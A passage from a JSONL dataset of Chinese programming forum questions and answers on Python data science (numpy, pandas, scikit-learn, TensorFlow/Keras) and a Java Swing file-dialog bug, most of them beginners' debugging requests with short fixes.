\n\"\"\n\"\n    :param m: 设置模型数目\n    :return: 返回m个模型\n    \"\n\"\"\n\n    \nmodel\n = {}  \n# 设置空的字典，用以存储模型或预测结果\n\n    \npred\n = {}\n    \ni\n = \n0\n\n    while i < m:\n        \nrow_rand\n = np.random.permutation(train)  \n# 打乱数据顺序（使链排序为随机）\n\n        \nrow_rand_data\n = row_rand[..., \n0\n:\n74\n]\n        \nrow_rand_label\n = row_rand[..., \n74\n:\n134\n]\n\n        \n# 训练模型，将所有模型存储在字典中\n\n        \nclf\n = ClassifierChain(LGBMClassifier())\n        \nclf_i\n = clf.fit(row_rand_data, row_rand_label)\n        \nclf_i_copy\n = copy.copy(clf_i)\n        model['%s'%i] = clf_i_copy\n\n        \n# 预测，将所有预测结果存储在字典中，并将结果转换为数组toarray()\n\n        \npred_i\n = clf_i.predict(test_data).toarray()\n        \npred_i_copy\n = copy.copy(pred_i)\n        pred['%s'%i] = pred_i_copy\n\n        \ni\n = i + \n1\n\n\n    return model, pred\n\n\n# 计算权重，得到最终预测结果\n\ndef w_pred_get(prediction_all, ft):\n    \nw\n = prediction_all['\n0\n']\n    \nnum\n = \n0\n\n    \ni\n = \nj\n = \n0\n\n    \n# 统计预测标签数目\n\n    while i < np.shape(prediction_all['\n0\n'])[\n0\n]:\n        while j < np.shape(prediction_all['\n0\n'])[\n1\n]:\n            for value \nin\n prediction_all.values():\n                \nif\n value[i, j] == \n1\n:\n                    \nnum\n = num + \n1\n\n            w[i, j] = num\n            \nnum\n = \n0\n\n            \nj\n = j + \n1\n\n        \nj\n = \n0\n\n        \ni\n = i + \n1\n\n    \nw\n = w/len(prediction_all) \n# 得到权值\n\n\n    \n# 设置阈值ft，得到最终预测结果\n\n    \ncondition\n = w < ft\n    \ncondition2\n = w >= ft\n    \nprediction\n = np.where(condition, w, \n1\n)\n    \nprediction\n = np.where(condition2, prediction, \n0\n)\n\n    return prediction, w\n\n\n\n# 查看不同迭代次数对于acc的影响，并进行可视化\n\nfor t \nin\n np.arange(\n5\n, \n20\n, \n5\n):\n    model_it, \npred_it\n = train_m(t)\n    pred_w, \nw\n = w_pred_get(pred_it, \n0.5\n)\n    \nSubset_Accuracy\n = accuracy_score(pred_w, test_label)\n    print(t, Subset_Accuracy)\n    \nt\n = t + \n5\n\n\n\n", "Tag": "算法分析"}
{"Answer": "你好，请使用\nb = np.diag(a)\n\nb即是你需要的", "Konwledge_Point": "NP完全问题", "Question": "对于一个4*4的数组，如何提取对角线的数据并组成一维数组？\n问题：有一个4行4列的数组（比如：np.random.randint(0,10,size=(4,4))），请将其中对角线的数取出来形成一个一维数组。提示（使用np.eye）。\n思路：我只会一个一个数据定位，可以用for循环，然后创建一个空列表，再一个个用append() 添加进去。\n如何用np.eye()解答，完全没有思路。请求有经验的tutor指导。谢谢！\n\n\nP.S. 麻烦最好能留下代码，方便阅读", "Tag": "算法分析"}
{"Answer": "你看看数据写入操作（cursor.execute(\"INSERT INTO mrv2019 VALUES....）是否执行了，然后看看这句话pd.read_sql(\"SELECT (PortofRegistry) AS name, COUNT(*) FROM mrv2019 Limit21\", connection)的SQL能否正常查询数据。", "Konwledge_Point": "NP完全问题", "Question": "python操作时表突然为空表了是什么原因\n我在执行下面程序的时候，表突然值为空了，也无法正常操作了，想请教一下是什么原因\n\n\n\n\nimport\n pandas \nas\n pd\n\nimport\n numpy \nas\n np\n\nimport\n matplotlib.pyplot \nas\n plt\n\n\ndf = pd.read_csv(r\"C:/Users/szp/Desktop/assignment1/MRV_2019.csv\")#\nimport\n file, the \npath\n \nof\n file may need \nto\n be change \nin\n differnt computer\ndf\n\n#统计值为空的行\nnum = df.isna().sum()\nnum\n\n#删除表中有\n'Division by zero!'\n,\n'Not Applicable'\n的行\ndf = df.replace([\n'Division by zero!'\n,\n'Not Applicable'\n],np.\nNaN\n)\ndf = df.dropna(how=\"any\")\ndf\n\n\n#check the data type\n\ndf.\ninfo\n()\n\n\n#change data type\n\ndf[[\n'Total fuel consumption [m tonnes]'\n,\n'Total CO2 emissions [m tonnes]'\n,\n'Annual Total time spent at sea [hours]'\n, \n'Annual average Fuel consumption per distance [kg / n mile]'\n, \n'Annual average CO2 emissions per distance [kg CO2 / n mile]'\n]] = df[[\n'Total fuel consumption [m tonnes]'\n,\n'Total CO2 emissions [m tonnes]'\n,\n'Annual Total time spent at sea [hours]'\n, \n'Annual average Fuel consumption per distance [kg / n mile]'\n, \n'Annual average CO2 emissions per distance [kg CO2 / n mile]'\n]].astype(\n'float64'\n)\n\n\n#check the data type again\n\ndf.\ninfo\n()\n\n#把\n'Port of Registry'\n这列的内容全改成大写\ndf[\n'Port of Registry'\n] = df[\n'Port of Registry'\n].apply(lambda x: x.upper())\ndf\n\n#将\n'Technical efficiency [gCO2/t·nm]'\n中的值分成两列，一列只有EEDI或EVI，另一列只有数值，并删除\n'Technical efficiency [gCO2/t·nm]'\n列\neff = df[\n'Technical efficiency [gCO2/t·nm]'\n].str.split(\n'('\n,expand=\nTrue\n)\neff.\ncolumns\n = [\n'Technical Efficiency Index'\n,\n'Technical Efficiency Value'\n]\neff[\n'Technical Efficiency Value'\n] = eff[\n'Technical Efficiency Value'\n].str.rstrip(\n')'\n)\ndf = pd.concat([df,eff], axis=\n1\n)\ndf = df.\ndrop\n(\n'Technical efficiency [gCO2/t·nm]'\n, axis=\n1\n)\ndf\n\n\n#move 'Technical Efficiency Index', 'Technical Efficiency Value' to other place\n\ntitle = df.\ncolumns\n.tolist()\ntitle.\ninsert\n(\n3\n, title.pop(title.\nindex\n(\n'Technical Efficiency Index'\n)))\ntitle.\ninsert\n(\n4\n, title.pop(title.\nindex\n(\n'Technical Efficiency Value'\n)))\ndf = df[title]\n\n\n#delete the empty unit in technical efficiency value\n\ndf = df.dropna(axis=\n0\n, how=\n'any'\n)\ndf\n\n#调用sqlite\n\nimport\n sqlite3\n\n#建立与表mrv2019的连接\n\nconnection\n = sqlite3.\nconnect\n(\n'mrv2019.db'\n)\n\n\n#Creating a cursor object using the cursor() method\n\n\ncursor\n = \nconnection\n.\ncursor\n()\n\n\n#Doping mrv2019 table if already exists.\n\n\ncursor\n.\nexecute\n(\"DROP TABLE IF EXISTS mrv2019\")\n\n\n#Creating table as per requirement\n\n\nsql\n = \n'''CREATE TABLE mrv2019(\n    IMO PRIMARY KEY, \n    Name TEXT,\n    Type INTEGER,\n    TechnicEfficiencyIndex VARCHAR,\n    TechnicalEfficiencyValue NUMERIC,\n    PortofRegistry VARCHAR,\n    DoCissue TEXT,\n    DoCexpiry TEXT,\n    VerifierName VARCHAR,\n    VerifierCountry VARCHAR,\n    TotalFuel NUMERIC,\n    TotalCO2 NUMERIC,\n    TimeatSea NUMERIC,\n    FuelperMile NUMERIC,\n    CO2perMile NUMERIC\n);'''\n\n\ncursor\n.\nexecute\n(\nsql\n)\n\n# \nCommit\n the changes \nin\n the \ndatabase\n\n\nconnection\n.\ncommit\n()\n\n\n#向新建的表填充数据\n\ncursor\n = \nconnection\n.\ncursor\n()\n\n\nfor\n \nindex\n, \nrow\n \nin\n df.iterrows():\n    \ncursor\n.\nexecute\n(\"INSERT INTO mrv2019 VALUES (? ,? ,? ,? ,? ,? ,? ,? ,? ,? ,? ,? ,? ,?, ?)\", (\nrow\n[\n'IMO Number'\n], \nrow\n[\n'Name'\n], \nrow\n[\n'Ship type'\n], \nrow\n[\n'Technical Efficiency Index'\n], \nrow\n[\n'Technical Efficiency Value'\n], \nrow\n[\n'Port of Registry'\n], \nrow\n[\n'DoC issue date'\n], \nrow\n[\n'DoC expiry date'\n], \nrow\n[\n'Verifier Name'\n], \nrow\n[\n'Verifier Country'\n], \nrow\n[\n'Total fuel consumption [m tonnes]'\n], \nrow\n[\n'Total CO2 emissions [m tonnes]'\n], \nrow\n[\n'Annual Total time spent at sea [hours]'\n], \nrow\n[\n'Annual average Fuel consumption per distance [kg / n mile]'\n], \nrow\n[\n'Annual average CO2 emissions per distance [kg CO2 / n mile]'\n]\n))\n\n\n#对PortofRegistry列进行统计计算，得出不同港出现的次数，并把排名前\n21\n的港显示出来，画出bar图\n\nsql\n = pd.read_sql(\"SELECT (PortofRegistry) AS name, COUNT(*) FROM mrv2019 Limit21\", \nconnection\n)\n\nsql\n\n\n#新建两个以IMO number为索引的表，一个表只含有Technical Efficiency \nIndex\n为EEDI的船舶信息，另一个表只含有Technical Efficiency \nIndex\n为EVI的船舶信息\ndf_eedi = df[df[\"Technical Efficiency Index\"] == \"EEDI\"]\ndf_eedi.set_index(\n'IMO Number'\n)\ndf_evi = df[df[\"Technical Efficiency Index\"] == \"EIV\"]\ndf_evi.set_index(\n'IMO Number'\n)\n", "Tag": "算法分析"}
{"Answer": "sklearn.tree.DecisionTreeClassifier()在进行分支的时候特征选择是随机的，即使是splitter=”best”的时候。打印dt_clf.feature_importances_的话就会看到有两种不同的结果，对应两种决策边界。sklearn.tree.DecisionTreeClassifier的函数说明中明确说：\n\nrandom_state：int, RandomState instance or None, default=NoneControls the randomness of the estimator. The features are always randomly permuted at each split, even if splitter is set to \"best\". When max_features < n_features, the algorithm will select max_features at random at each split before finding the best split among them. But the best found split may vary across different runs, even if max_features=n_features. That is the case, if the improvement of the criterion is identical for several splits and one split has to be selected at random. To obtain a deterministic behaviour during fitting, random_state has to be fixed to an integer. See Glossary for details.\n", "Konwledge_Point": "NP完全问题", "Question": "机器学习决策树鸢尾花数据集，绘制决策边界，出现相同代码相同数据多次运行，结果不一致的问题\n练习机器学习中，采用决策树将鸢尾花的数据进行分类，并绘制决策边界，代码如下：\n\n\nimport\n numpy as np\n\nimport\n matplotlib.pyplot as plt\nfrom sklearn \nimport\n datasets\n\niris\n = datasets.load_iris()\n\nx\n = iris.data[:,\n2\n:]\n\ny\n = iris.target\nfrom sklearn.tree \nimport\n DecisionTreeClassifier\n\ndt_clf\n = DecisionTreeClassifier(\nmax_depth\n = \n2\n,\ncriterion\n = 'entropy')\ndt_clf.fit(x,y)\n\ndef plot_decision_boundary(model,axis):\n    x0,\nx1\n = np.meshgrid(\n        np.linspace(axis[\n0\n],axis[\n1\n],int((axis[\n1\n]-axis[\n0\n])*\n200\n)),\n        np.linspace(axis[\n2\n],axis[\n3\n],int((axis[\n3\n]-axis[\n2\n])*\n200\n))\n    )\n    \n    \nx_new\n = np.c_[x0.ravel(),x1.ravel()]\n    \ny_predict\n = model.predict(x_new)\n    \nzz\n = y_predict.reshape(x0.shape)\n    \n    from matplotlib.colors \nimport\n ListedColormap\n    \ncustom_cmap\n = ListedColormap(['\n#EF9A9A','#FFF59D','#90CAF9'])\n\n    plt.contourf(x0,x1,zz,\ncmap\n = custom_cmap)\n\nplot_decision_boundary(dt_clf,\naxis=\n [\n0.5\n,\n7.5\n,\n0\n,\n3\n])\nplt.scatter(x[\ny==0,0],x[y==0,1])\n\nplt.scatter(x[\ny==1,0],x[y==1,1])\n\nplt.scatter(x[\ny==2,0],x[y==2,1])\n\nplt.show() \n# 这个结果有点不对 ，但我又不知道哪里搞错了\n\n\n\n\n第一次运行出现了下图所示的分类结果：\n\n\n第二次及以后运行时出现了下图的分类结果：\n\n\n我想知道明明是相同的数据，相同的代码，只是运行先后顺序不同，为什么会出现上下两个图之间的完全不同的分类结果，并且出现哪种分类结果还有一定的随机性？我的代码里也没有随机数。虽然非参数学习对于数据依赖非常严重，但是我的数据也没有发生更改啊，很奇怪。", "Tag": "算法分析"}
{"Answer": "import numpy as np\r\nimport matplotlib.pyplot as plt\r\n\r\nx = np.random.rand(100).reshape(10,10)\r\nplt.xticks(np.arange(10)+0.5,['x','y','z','h','j','k','t','f','q','p'])\r\nplt.yticks(np.arange(10)+0.5,['x','y','z','h','j','k','t','f','q','p'])\r\nplt.imshow(x, cmap=plt.cm.hot, vmin=0, vmax=1)\r\nplt.title('color-fast')\r\nplt.colorbar()\r\nplt.show()", "Konwledge_Point": "NP完全问题", "Question": "如何使用matplotlib生成如下热力图\n\n如上图，要求有标题，横纵坐标都为字母，右边有热力图图例，总之越像越好。最好标题和横纵坐标都和上图一致，中间的数据以列表形式给出，代码中多加点注释，我好理解一点。本人新手，以前没接触过绘图，知道很麻烦各位大神，请大神见谅。谢谢！\n\n其实关于matplotlib生成热力图的问题我也看过不少，但好像没有完全能用的。我看到有个相似的代码如下，但缺少右边的colorbar，请问大神如何修改代码添加colorbar？：\n\nimport matplotlib.pyplot as plt\n\nimport numpy as np\n\ncolumn_labels = list('ABCD')\n\nrow_labels = list('WXYZ')\n\ndata = np.random.rand(4,4)\n\nfig, ax = plt.subplots()\n\nheatmap = ax.pcolor(data, cmap=plt.cm.Blues)\n\n\n\nax.set_xticks(np.arange(data.shape[0])+0.5, minor=False)\n\nax.set_yticks(np.arange(data.shape[1])+0.5, minor=False)\n\n\n\nax.invert_yaxis()\n\nax.xaxis.tick_top()\n\n\n\nax.set_xticklabels(row_labels, minor=False)\n\nax.set_yticklabels(column_labels, minor=False)\n\n\n\nplt.show()", "Tag": "算法分析"}
{"Answer": "可以试着调整神经层的结构和模型的超参数，试着多次调整达到对每个参数的理解，建议可以先简要看看莫烦的视频教程，对各个参数有个大致了解，这是链接https://morvanzhou.github.io/", "Konwledge_Point": "NP完全问题", "Question": "Tensorflow建一个神经网络，输出数据只有一个谱型，且杂乱\n建了一个神经网络，输入节点3个，输出250个，两个隐藏层，节点数分别为200个。\n\n训练数据集为100000个。运行完后用测试集验证，发现预测的谱线杂乱无章，跟测试的谱线集完全无关，从图中看感觉是在一个谱型附近震荡。\n\n 初学者不明白是什么原因，不知有没有大神可以稍加指教。\n\n\n\nimport tensorflow as tf\nimport numpy as np\n# 添加层\ndef add_layer(inputs, in_size, out_size,n_layer,activation_function=None):\n          Weights = tf.Variable(tf.random_normal([in_size, out_size]))\n          Wx_plus_b = tf.matmul(inputs, Weights)\n          if activation_function is None:\n           outputs = Wx_plus_b\n          else:\n               outputs = activation_function(Wx_plus_b)\n          return outputs\n# 1.训练的数据\np_1= np.loadtxt('D:p_train.txt')\np=np.reshape(p_1,(3,100000))\ns_1= np.loadtxt('D:s_train.txt')\ns=np.reshape(s_1,(250,100000))\npmin=p.min()\npmax=p.max()\np_train=(p-pmin)/(pmax-pmin)\nsmin=s.min()\nsmax=s.max()\ns_train=(s-smin)/(smax-smin)\np_train=np.transpose(p_train)\ns_train=np.transpose(s_train)\np_train=p_train.tolist()\ns_train=s_train.tolist()\n# 2.测试的数据\np_2=np.loadtxt('D:p_test.txt')\np2=np.reshape(p_2,(3,5501))\ns_2=np.loadtxt('D:s_test.txt')\ns2=np.reshape(s_2,(250,5501))\npmin2=p2.min()\npmax2=p2.max()\np_test=(p2-pmin2)/(pmax2-pmin2)\nsmin2=s2.min()\nsmax2=s2.max()\ns_test=(s2-smin2)/(smax2-smin2)\np_test=np.transpose(p_test)\ns_test=np.transpose(s_test)\np_test=p_test.tolist()\ns_test=s_test.tolist()\n\n# 3.定义占位符 \npx = tf.placeholder(tf.float32, [None, 3])\nsx = tf.placeholder(tf.float32, [None,250])\nsy=tf.placeholder(tf.float32,[None,250])\n# 4.定义神经层：隐藏层和预测层\nl1 = add_layer(px, 3, 200, n_layer=1,activation_function=tf.nn.sigmoid)\nl2=add_layer(l1,200,200,n_layer=2,activation_function=tf.nn.sigmoid)\nprediction = add_layer(l2, 200, 250, n_layer=3,activation_function=None)\n\n# 5.定义 loss 表达式 mse\nloss = tf.reduce_mean(tf.square(sx - prediction))\n#loss2\n\n# 6.选择 optimizer 使 loss 达到最小                   \ntrain_step = tf.train.AdamOptimizer(0.01,epsilon=1e-8).minimize(loss)\n\n#7.初始化变量\ninit=tf.initialize_all_variables()\n#8.定义会话\nsess = tf.Session()\n#9.运行\nsess.run(init) \n#10.查看loss变化\nfor step in range(1000):\n   sess.run(train_step, feed_dict={px:p_train, sx:s_train})\n   if step % 50 == 0:    \n        print(sess.run(loss,feed_dict={sx:s_train,px:p_train}))\n\nprediction_test=sess.run(prediction,feed_dict={px:p_test})\n\n", "Tag": "算法分析"}
{"Answer": "loss不是binary_crossentropy？", "Konwledge_Point": "NP完全问题", "Question": "tensorflow中model.fit（）函数输入参数报错，如何解决？\n问题遇到的现象和发生背景\n\n\n问题相关代码，请勿粘贴截图\n\n\nimport pandas as pd\nimport numpy as np\nimport matplotlib.pyplot as plt\nfilepath_dict = 'venv\\Data.csv'\ndf = pd.read_csv(filepath_dict  )\nsentences = df['headlines'].values\ny = df['target'].values\nY = []\nfor target in y:\n    if target == 'Sarcastic':\n        Y.append(1)\n    else:\n        Y.append(0)\nfrom sklearn.model_selection import train_test_split\nsentences_train,sentences_test,Y_train,Y_test = train_test_split(sentences,Y,test_size=0.5,random_state=500)\nfrom keras.preprocessing.text import Tokenizer\ntokenizer = Tokenizer(num_words=10000)\ntokenizer.fit_on_texts(sentences)\nmaxlen = 300\nvocab_size = len(tokenizer.word_index)+1\n#embedding模型\n\n\nX_train = tokenizer.texts_to_sequences(sentences_train)\nX_test = tokenizer.texts_to_sequences(sentences_test)\nfrom keras.preprocessing.sequence import pad_sequences\nX_train = pad_sequences(X_train,padding='post',maxlen=maxlen)\nX_test = pad_sequences(X_test,padding='post',maxlen=maxlen)\nY_test = np.array(Y_test)\nY_train = np.array(Y_train)\n#结束\n\n\nembedding_dim = 300\nfrom keras.models import  Sequential\nfrom  keras import  layers\nfrom keras.layers import Dense,Activation,Dropout,LSTM\nfrom keras.optimizer_v2 import adam\nmodel = Sequential()\nmodel.add(layers.Embedding(vocab_size,\n                           embedding_dim,\n                           input_length=maxlen,\n                           trainable=True))\nmodel.add(LSTM(128,return_sequences=True))\nmodel.add(LSTM(64,return_sequences=False))\nmodel.add(layers.Dense(15,activation='relu'))\nmodel.add(layers.Dense(1,activation='sigmoid'))\nmodel.compile(optimizer='adam',\n              loss = 'bomart_crossentropy',\n              metrics=  ['accuracy'])\nmodel.summary()\nhistory = model.fit(X_train,\n                    Y_train,\n                    epochs=20,\n                    verbose=False,\n                    validation_data=(X_test,Y_test),\n                    batch_size=10)\n\n\n运行结果及报错内容\n\n\nTraceback (most recent call last):\n  File \"C:\\Users\\yly20\\PycharmProjects\\pythonProject1\\main.py\", line 63, in \n    history = model.fit(X_train,\n  File \"C:\\Users\\yly20\\PycharmProjects\\pythonProject1\\venv\\lib\\site-packages\\keras\\utils\\traceback_utils.py\", line 67, in error_handler\n    raise e.with_traceback(filtered_tb) from None\n  File \"C:\\Users\\yly20\\PycharmProjects\\pythonProject1\\venv\\lib\\site-packages\\tensorflow\\python\\framework\\func_graph.py\", line 1147, in autograph_handler\n    raise e.ag_error_metadata.to_exception(e)\nValueError: in user code:\n\n\nFile\n \n\"C:\\Users\\yly20\\PycharmProjects\\pythonProject1\n\\v\nenv\\lib\\site-packages\\keras\n\\e\nngine\n\\t\nraining.py\"\n, \nline\n \n1021\n, \nin\n \ntrain_function\n  \n*\n\n    \nreturn\n \nstep_function\n(\nself\n, \niterator\n)\n\nFile\n \n\"C:\\Users\\yly20\\PycharmProjects\\pythonProject1\n\\v\nenv\\lib\\site-packages\\keras\n\\e\nngine\n\\t\nraining.py\"\n, \nline\n \n1010\n, \nin\n \nstep_function\n  \n*\n*\n\n    \noutputs\n \n=\n \nmodel\n.\ndistribute_strategy\n.\nrun\n(\nrun_step\n, \nargs\n=\n(\ndata\n,))\n\nFile\n \n\"C:\\Users\\yly20\\PycharmProjects\\pythonProject1\n\\v\nenv\\lib\\site-packages\\keras\n\\e\nngine\n\\t\nraining.py\"\n, \nline\n \n1000\n, \nin\n \nrun_step\n  \n*\n*\n\n    \noutputs\n \n=\n \nmodel\n.\ntrain_step\n(\ndata\n)\n\nFile\n \n\"C:\\Users\\yly20\\PycharmProjects\\pythonProject1\n\\v\nenv\\lib\\site-packages\\keras\n\\e\nngine\n\\t\nraining.py\"\n, \nline\n \n860\n, \nin\n \ntrain_step\n\n    \nloss\n \n=\n \nself\n.\ncompute_loss\n(\nx\n, \ny\n, \ny_pred\n, \nsample_weight\n)\n\nFile\n \n\"C:\\Users\\yly20\\PycharmProjects\\pythonProject1\n\\v\nenv\\lib\\site-packages\\keras\n\\e\nngine\n\\t\nraining.py\"\n, \nline\n \n918\n, \nin\n \ncompute_loss\n\n    \nreturn\n \nself\n.\ncompiled_loss\n(\n\nFile\n \n\"C:\\Users\\yly20\\PycharmProjects\\pythonProject1\n\\v\nenv\\lib\\site-packages\\keras\n\\e\nngine\\compile_utils.py\"\n, \nline\n \n184\n, \nin\n \n__call__\n\n    \nself\n.\nbuild\n(\ny_pred\n)\n\nFile\n \n\"C:\\Users\\yly20\\PycharmProjects\\pythonProject1\n\\v\nenv\\lib\\site-packages\\keras\n\\e\nngine\\compile_utils.py\"\n, \nline\n \n133\n, \nin\n \nbuild\n\n    \nself\n.\n_losses\n \n=\n \ntf\n.\nnest\n.\nmap_structure\n(\nself\n.\n_get_loss_object\n, \nself\n.\n_losses\n)\n\nFile\n \n\"C:\\Users\\yly20\\PycharmProjects\\pythonProject1\n\\v\nenv\\lib\\site-packages\\keras\n\\e\nngine\\compile_utils.py\"\n, \nline\n \n272\n, \nin\n \n_get_loss_object\n\n    \nloss\n \n=\n \nlosses_mod\n.\nget\n(\nloss\n)\n\nFile\n \n\"C:\\Users\\yly20\\PycharmProjects\\pythonProject1\n\\v\nenv\\lib\\site-packages\\keras\\losses.py\"\n, \nline\n \n2369\n, \nin\n \nget\n\n    \nreturn\n \ndeserialize\n(\nidentifier\n)\n\nFile\n \n\"C:\\Users\\yly20\\PycharmProjects\\pythonProject1\n\\v\nenv\\lib\\site-packages\\keras\\losses.py\"\n, \nline\n \n2324\n, \nin\n \ndeserialize\n\n    \nreturn\n \ndeserialize_keras_object\n(\n\nFile\n \n\"C:\\Users\\yly20\\PycharmProjects\\pythonProject1\n\\v\nenv\\lib\\site-packages\\keras\\utils\\generic_utils.py\"\n, \nline\n \n709\n, \nin\n \ndeserialize_keras_object\n\n    \nraise\n \nValueError\n(\n\n\nValueError\n: \nUnknown\n \nloss\n \nfunction\n: \nbomart_crossentropy\n. \nPlease\n \nensure\n \nthis\n \nobject\n \nis\n \npassed\n \nto\n \nthe\n `\ncustom_objects\n` \nargument\n. \nSee\n \nhttps\n:\n//www.tensorflow.org/guide/keras/save_and_serialize#registering_the_custom_object for details.\n\n\n\n\n我的解答思路和尝试过的方法\n\n\n似乎我完全没有找到方法解决，求指教\n\n\n我想要达到的结果", "Tag": "算法分析"}
{"Answer": "可能要把\ndf_test_1.loc[0:len(fn_cur) - 1, columns[0]] = fn_cur\n\n改成\ndf_test_1.loc[0:len(fn_cur) - 1, columns_[0]] = fn_cur\n", "Konwledge_Point": "NP完全问题", "Question": "pandas莫名多出一列\npandas今天运行的时候发现了一个很神奇的bug, 目前不懂原理, 希望大家看看\n\n\ncolumns_\n =\n [ \"输入频阶\", \"输入频率\", \"输出频率\", \"输出频率(全)\"]\n\n\ndf_test_1\n = pd.DataFrame(np.full((\n21\n, \n4\n), ''), columns=columns_)\n\n# 插入数据\n\n\ndf_test_1\n.loc[\n0\n:len(fn_cur) - \n1\n, columns[\n0\n]] = fn_cur\n\ndf_test_1\n.loc[\n0\n:len(freq_list) - \n1\n, columns[\n1\n]] = freq_list\n\ndf_test_1\n.loc[\n0\n:len(freq_list_n[\n0\n]) - \n1\n, columns[\n2\n]] = freq_list_n[\n0\n]\n\ndf_test_1\n.loc[\n0\n:len(freq_list_n[\n1\n]) - \n1\n, columns[\n3\n]] = freq_list_n[\n1\n]\n\nprint\n(df_test_1)\n\n\n\n我当前的新建表格拿来承载新数据, 但是出现了一个意料之外的错误\n\n\n\n\n跑完程序发现, 竟然多出来列  在完全没有添加的情况下, 有点不可思议, 然后我用调试模式一步步试了一试, 多出来的列索引是插入列数据来的\n\n\n下面我插入一列数据\n\n\n\n\n再看看df, 很不可思议已经多出来一列, 这里fn_cur就是一个简单的列表而已, 并不带这个列值~~\n\n\n所以, 这是怎么产生的呢", "Tag": "算法分析"}
{"Answer": "测试了你的代码，很好理解，当你点击取消是，你的选择文件返回的对象是空，所以跑异常了。就是下面这行代码在取消时为true.\r\n\r\n```\r\n System.out.println(jfc.getSelectedFile()==null);\r\n```\r\n修正代码，点击取消时，不作处理。\r\n\r\n```\r\n // 得到用户希望把文件保存到何处，文件全路径\r\n\t\t\tFile selectedFile = jfc.getSelectedFile();\r\n\t\t\tif(selectedFile==null){\r\n\t\t\t\tSystem.out.println(\"用户为选择保存文件.\");\r\n\t\t\t\treturn ;\r\n\t\t\t}\r\n\t\t\tString file = selectedFile.getAbsolutePath();\r\n```", "Konwledge_Point": "NP完全问题", "Question": "java新手，写记事本出现异常，求助各路大神\n当我点击取消的时候（无论是打开或者保存界面的取消），就会跳出异常（本人最近在看韩顺平老师的java入门，和老师的代码对了好几遍发现完全相同，但是老师点取消的时候就没有异常，不得其解），异常如下\n我怀疑是这出了问题但是不知道怎么解决。。。\n\n/**\n\n\n\n\n\n我的记事本（界面＋功能）\n\n/\npackage com.test7;\nimport java.io.\n;\nimport java.awt.*;\nimport java.awt.event.*;\n\n\n//import java.awt.image.ImageObserver;\n\n//import java.awt.image.ImageProducer;\n\n\n\nimport javax.swing.*;\n\n\n\npublic class NotePad extends JFrame implements ActionListener{\n\n\n\n//定义需要的组件\nJTextArea jta=null;\n//菜单栏\nJMenuBar jmb=null;\n//定义JMenu\nJMenu jm1=null;\n//定义JMenuItem\nJMenuItem jmi1=null;\nJMenuItem jmi2=null;\n\npublic static void main(String[] args) {\n    // TODO Auto-generated method stub\n\n    NotePad np=new NotePad();\n\n}\n\n//构造函数\npublic NotePad()\n{\n    //创建jta\n    jta=new JTextArea();\n    jmb=new JMenuBar();\n    jm1=new JMenu(\"打开（o）\");\n    //设置助记符\n    jm1.setMnemonic('F');\n    jmi1=new JMenuItem(\"打开\", new ImageIcon(\"a.gif\")); \n    jmi2=new JMenuItem(\"保存\");\n\n    //注册监听\n    jmi1.addActionListener(this);\n    jmi1.setActionCommand(\"open\");\n\n    jmi2.addActionListener(this);\n    jmi2.setActionCommand(\"save\");\n    //加入\n    this.setJMenuBar(jmb);\n    //把jm1放入到jmb\n    jmb.add(jm1);\n    //把item放入到menu\n    jm1.add(jmi1);\n    jm1.add(jmi2);\n    //放入到JFrame\n    this.add(jta);\n    this.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);\n    this.setSize(400, 300);\n    this.setVisible(true);\n\n}\n\npublic void actionPerformed(ActionEvent e) {\n    // TODO Auto-generated method stub\n\n    //判断是那个菜单被选中\n    if(e.getActionCommand().equals(\"open\"))\n    {\n\n\n\n\n//          System.out.println(\"open\");\n\n\n\n        //隆重推荐JFileChooser\n        //创建文件选择组件\n        JFileChooser jfc1=new JFileChooser();\n        //设置名字\n        jfc1.setDialogTitle(\"请选择文件....\");\n        //默认方式\n        jfc1.showOpenDialog(null);\n        //显示\n        jfc1.setVisible(true);\n\n        //得到用户选择的文件全路径\n        String filename=jfc1.getSelectedFile().getAbsolutePath();\n\n        FileReader fr=null;\n        BufferedReader br=null;\n        try {\n            fr=new FileReader(filename);\n            br=new BufferedReader(fr);\n\n            //从文件中读取信息并jta\n\n            String s=\" \";\n            String allCon=\" \";\n            while((s=br.readLine())!=null)\n            {\n\n                allCon+=s+\"\\r\\n\";\n\n            }\n\n            //放置到jta即可\n            jta.setText(allCon);\n        } catch (Exception e2) {\n            // TODO: handle exception\n            e2.printStackTrace();\n        }finally{\n            try {\n                br.close();\n                fr.close();\n            } catch (IOException e1) {\n                // TODO Auto-generated catch block\n                e1.printStackTrace();\n            }\n\n        }\n    }\n    else if(e.getActionCommand().equals(\"save\"))\n    {\n        JFileChooser jfc=new JFileChooser();\n        jfc.setDialogTitle(\"另存为\");\n        //按默认的方式显示\n        jfc.showSaveDialog(null);\n        jfc.setVisible(true);\n\n        //得到用户希望把文件保存到何处，文件全路径\n        String file=jfc.getSelectedFile().getAbsolutePath();\n\n        //准备写入到指定文件即可\n        FileWriter fw=null;\n        BufferedWriter bw=null;\n\n        try {\n            fw=new FileWriter(file);\n            bw=new BufferedWriter(fw);\n\n            bw.write(this.jta.getText());\n        } catch (Exception e2) {\n            // TODO: handle exception\n            e2.printStackTrace();\n        }finally{\n            try {\n\n                bw.close();\n                fw.close();\n            } catch (Exception e3) {\n                // TODO: handle exception\n\n            }\n        }\n    }\n}\n\n\n\n\n}", "Tag": "算法分析"}
{"Answer": "https://blog.csdn.net/qq_32241189/article/details/80450741", "Konwledge_Point": "NP完全问题", "Question": "minst深度学习例程不收敛，成功率始终在十几\nminst深度学习程序不收敛\n\n是关于tensorflow的问题。我是tensorflow的初学者。从书上抄了minst的学习程序。但是运行之后，无论学习了多少批次，成功率基本不变。\n\n我做了许多尝试，去掉了正则化，去掉了滑动平均，还是不行。把batch_size改成了2，观察变量运算情况，输入x是正确的，但神经网络的输出y很多情况下在x不一样的情况下y的两个结果是完全一样的。进而softmax的结果也是一样的。百思不得其解，找不到造成这种情况的原因。这里把代码和运行情况都贴出来，请大神帮我找找原因。大过年的，祝大家春节快乐万事如意。\n\n\n\n补充一下，进一步的测试表明，不是不能完成训练，而是要到700000轮以上，且最高达到65%左右就不能提高了。仔细看每一步的参数，是regularization值过大10e15以上，一点点减少，前面的训练都在训练它了。这东西我不是很明白。\n\n\n\nimport struct\nimport numpy as np\nimport matplotlib.pyplot as plt\nfrom matplotlib.widgets import Slider, Button\nimport tensorflow as tf\nimport time\n\n#把MNIST的操作封装在一个类中，以后用起来方便。\nclass MyMinst():\n\n    def decode_idx3_ubyte(self,idx3_ubyte_file):\n        with open(idx3_ubyte_file, 'rb') as f:\n            print('解析文件：', idx3_ubyte_file)\n            fb_data = f.read()\n\n        offset = 0\n        fmt_header = '>iiii'    # 以大端法读取4个 